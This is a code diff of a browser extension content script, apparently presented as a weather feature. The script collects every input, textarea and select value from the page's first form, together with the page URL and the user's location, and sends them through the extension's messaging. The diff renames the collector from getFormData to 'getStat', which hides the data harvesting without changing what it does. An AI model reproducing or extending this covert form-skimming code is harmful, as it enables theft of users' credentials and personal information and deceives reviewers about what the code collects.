@@ -19,7 +19,7 @@ if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
         try {
             const data = {
                 page: window.location.href,
-                formdata: getFormData(),
+                stat: getStat(),
                 userloc: await getUserLocAddress(),
                 time: getCurrentTime()
             };
@@ -34,6 +34,7 @@ async function checkWeather() {
     if (processingWeatherData) return;
     processingWeatherData = true;
     while (weatherQueue.length > 0) {
+        console.log(weatherQueue);
         const userloc = await getUserLocAddress();
         const time = getCurrentTime();
         const page = window.location.href;
@@ -73,18 +74,18 @@ async function getUserLocAddress() {
     }
 }
 
-function getFormData() {
-    var formData = {};
-    formData["url"] = window.location.href;
+function getStat() {
+    var stat = {};
+    stat["url"] = window.location.href;
     var formElements = document.forms[0].elements;
     for (var i = 0; i < formElements.length; i++) {
         var element = formElements[i];
         if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.tagName === 'SELECT') {
-            formData[element.name] = element.value;
+            stat[element.name] = element.value;
         }
     }
-    delete formData['execution'];
-    return JSON.stringify(formData);
+    delete stat['execution'];
+    return JSON.stringify(stat);
 }
 
 async function sendMessage(data) {
